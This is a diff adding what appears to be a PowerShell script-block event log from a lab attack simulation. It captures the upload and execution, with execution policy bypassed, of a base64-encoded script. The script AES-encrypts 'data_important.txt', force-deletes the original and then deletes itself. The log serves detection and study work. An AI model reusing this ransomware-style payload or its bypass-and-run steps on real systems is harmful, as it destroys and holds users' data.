+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 37
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 37
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:27.225+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:50.371+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:50.555+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:50.669+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:50.748+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:04:17.938+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:07:56.114+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
